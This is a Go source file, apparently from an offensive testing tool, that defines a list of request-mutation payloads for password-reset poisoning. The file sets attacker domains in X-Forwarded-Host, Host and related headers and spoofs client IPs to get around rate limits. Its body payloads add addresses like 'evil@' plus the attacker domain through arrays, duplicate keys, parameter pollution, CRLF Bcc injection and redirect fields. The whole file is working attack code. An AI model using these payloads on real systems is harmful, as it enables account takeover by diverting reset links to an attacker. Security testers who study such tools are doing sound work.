package main

type Payload struct {
	Name        string
	Mode        string
	Description string
	Apply       func(r ParsedRequest, attackerDomain string) ParsedRequest
}

var Payloads = []Payload{
	// ── HOST HEADER PAYLOADS ──────────────────────────────────────────────
	{
		Name:        "X-Forwarded-Host",
		Mode:        "header",
		Description: "inject attacker domain via X-Forwarded-Host header",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["X-Forwarded-Host"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "X-Original-Host",
		Mode:        "header",
		Description: "inject attacker domain via X-Original-Host header",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["X-Original-Host"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "X-Host",
		Mode:        "header",
		Description: "inject attacker domain via X-Host header",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["X-Host"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "Forwarded",
		Mode:        "header",
		Description: "inject attacker domain via Forwarded header",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["Forwarded"] = []string{"host=" + attackerDomain}
			return r
		},
	},
	{
		Name:        "X-Forwarded-Server",
		Mode:        "header",
		Description: "inject attacker domain via X-Forwarded-Server header",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["X-Forwarded-Server"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "X-HTTP-Host-Override",
		Mode:        "header",
		Description: "inject attacker domain via X-HTTP-Host-Override header",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["X-HTTP-Host-Override"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "Host override",
		Mode:        "header",
		Description: "replace Host header directly with attacker domain",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Host = attackerDomain
			r.Headers["Host"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "Host append",
		Mode:        "header",
		Description: "append attacker domain to original host",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["Host"] = []string{r.Host + "." + attackerDomain}
			return r
		},
	},
	{
		Name:        "Host fragment",
		Mode:        "header",
		Description: "inject attacker domain with fragment to bypass validation",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["Host"] = []string{attackerDomain + "#" + r.Host}
			return r
		},
	},
	{
		Name:        "X-Forwarded-Proto",
		Mode:        "header",
		Description: "inject attacker domain via X-Forwarded-Proto header",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["X-Forwarded-Proto"] = []string{attackerDomain}
			return r
		},
	},
	{
		Name:        "Referer header",
		Mode:        "header",
		Description: "inject attacker domain via Referer — some servers reflect it in reset link",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["Referer"] = []string{"https://" + attackerDomain}
			return r
		},
	},
	{
		Name:        "Origin header",
		Mode:        "header",
		Description: "inject attacker domain via Origin header",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["Origin"] = []string{"https://" + attackerDomain}
			return r
		},
	},
	// ── IP SPOOFING HEADERS ───────────────────────────────────────────────
	{
		Name:        "X-Forwarded-For spoof",
		Mode:        "header",
		Description: "spoof IP via X-Forwarded-For for rate limit bypass",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["X-Forwarded-For"] = []string{"127.0.0.1"}
			return r
		},
	},
	{
		Name:        "X-Real-IP spoof",
		Mode:        "header",
		Description: "spoof IP via X-Real-IP for rate limit bypass",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["X-Real-IP"] = []string{"127.0.0.1"}
			return r
		},
	},
	{
		Name:        "Client-IP spoof",
		Mode:        "header",
		Description: "spoof IP via Client-IP for rate limit bypass",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["Client-IP"] = []string{"127.0.0.1"}
			return r
		},
	},
	{
		Name:        "True-Client-IP spoof",
		Mode:        "header",
		Description: "spoof IP via True-Client-IP for rate limit bypass",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Headers["True-Client-IP"] = []string{"127.0.0.1"}
			return r
		},
	},
	// ── BODY MANIPULATION PAYLOADS ────────────────────────────────────────
	{
		Name:        "Array injection",
		Mode:        "body",
		Description: "wrap field values in array with attacker value appended",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = []any{v, "evil@" + attackerDomain}
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Mixed array",
		Mode:        "body",
		Description: "first field becomes array with attacker value, rest stay as strings",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			first := true
			for k, v := range r.Fields {
				if first {
					r.Fields[k] = []any{v, "evil@" + attackerDomain}
					first = false
				}
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Null confusion",
		Mode:        "body",
		Description: "set all field values to null",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k := range r.Fields {
				r.Fields[k] = nil
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Int confusion",
		Mode:        "body",
		Description: "set all field values to 0",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k := range r.Fields {
				r.Fields[k] = 0
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Bool confusion",
		Mode:        "body",
		Description: "set all field values to true",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k := range r.Fields {
				r.Fields[k] = true
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Duplicate keys",
		Mode:        "body",
		Description: "repeat each field key with attacker value second — parser picks last or first",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			// build raw JSON manually to allow duplicate keys
			raw := "{"
			for k, v := range r.Fields {
				raw += `"` + k + `":"` + v.(string) + `",`
				raw += `"` + k + `":"evil@` + attackerDomain + `",`
			}
			raw = raw[:len(raw)-1] + "}"
			UpdateContentLength(&r, raw)
			r.Body = raw
			return r
		},
	},
	{
		Name:        "HTML injection",
		Mode:        "body",
		Description: "inject HTML into field values — tests if reflected unsanitized in email",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = "<b>" + v.(string) + "</b>"
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Extra fields",
		Mode:        "body",
		Description: "append common callback/redirect fields pointing to attacker domain",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			extras := []string{"redirectUrl", "callbackUrl", "next", "returnUrl", "callback", "redirect"}
			for _, k := range extras {
				r.Fields[k] = "https://" + attackerDomain
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Nested object",
		Mode:        "body",
		Description: "wrap field values in nested object — tests alternative parsing paths",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = map[string]any{"value": v, "email": "evil@" + attackerDomain}
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Comma separated",
		Mode:        "body",
		Description: "append attacker value comma-separated in field string",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = v.(string) + ",evil@" + attackerDomain
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Pipe separated",
		Mode:        "body",
		Description: "append attacker value pipe-separated in field string",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = v.(string) + "|evil@" + attackerDomain
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "CRLF injection",
		Mode:        "body",
		Description: "inject CRLF + Bcc header into field value for email header injection",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			for k, v := range r.Fields {
				r.Fields[k] = v.(string) + "%0aBcc:evil@" + attackerDomain
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "backup_email field",
		Mode:        "body",
		Description: "add backup_email field pointing to attacker — some servers send reset to both",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Fields["backup_email"] = "evil@" + attackerDomain
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Nested user.email",
		Mode:        "body",
		Description: "add nested user object with attacker email — alternative parsing path",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			r.Fields["user"] = map[string]any{"email": "evil@" + attackerDomain}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
	{
		Name:        "Parameter pollution form",
		Mode:        "body",
		Description: "duplicate all params with attacker value second (form-encoded only)",
		Apply: func(r ParsedRequest, attackerDomain string) ParsedRequest {
			if r.BodyType != "form" {
				return r
			}
			for k, v := range r.Fields {
				r.Fields[k] = v.(string) + "&" + k + "=evil@" + attackerDomain
			}
			newBody := RebuildBody(r)
			UpdateContentLength(&r, newBody)
			r.Body = newBody
			return r
		},
	},
}
